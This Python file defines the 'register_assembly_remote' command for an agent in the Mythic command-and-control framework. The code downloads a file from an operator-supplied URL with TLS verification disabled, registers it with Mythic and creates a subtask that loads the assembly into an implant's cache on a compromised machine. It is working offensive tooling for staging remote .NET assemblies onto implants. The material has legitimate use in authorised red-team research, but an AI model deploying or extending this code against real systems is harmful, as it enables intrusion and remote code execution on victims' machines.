from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
import base64
import sys
import requests

class RegisterAssemblyRemoteArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file_url",
                cli_name="FileUrl", 
                display_name="File URL",
                type=ParameterType.String),
            CommandParameter(
                name="file_name",
                cli_name="FileName", 
                display_name="File Name",
                type=ParameterType.String)
        ]

    async def parse_arguments(self):
        if (self.command_line[0] != "{"):
            raise Exception("Inject requires JSON parameters and not raw command line.")
        self.load_args_from_json_string(self.command_line)


async def registerasm_remote_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    return response


class RegisterAssemblyRemoteCommand(CommandBase):
    cmd = "register_assembly_remote"
    attributes=CommandAttributes(
        dependencies=["register_assembly"]
    )
    needs_admin = False
    help_cmd = "register_assembly_remote (modal popup)"
    description = "Import a new Assembly into the agent cache from remote location."
    version = 2
    script_only = True
    author = "@OlegLerner"
    argument_class = RegisterAssemblyRemoteArguments
    attackmapping = []
    completion_functions = {"registerasm_remote_callback": registerasm_remote_callback}
    
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        # Download file
        fs_resp = requests.get(taskData.args.get_arg("file_url") ,verify=False)
        file_reg_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
            TaskID=taskData.Task.ID,
            DeleteAfterFetch=False,
            FileContents=fs_resp.content,
            Filename=taskData.args.get_arg("file_name")
        ))
        if not file_reg_resp.Success:
            raise Exception("Failed to register assembly: " + file_reg_resp.Error)
        await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            TaskID=taskData.Task.ID,
            CommandName="register_assembly",
            SubtaskCallbackFunction="registerasm_remote_callback",
            Params=json.dumps({"file": file_reg_resp.AgentFileId})
        ))
        if not response.Success:
            raise Exception("Failed to create subtask: {}".format(response.Error))
        return response
        

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
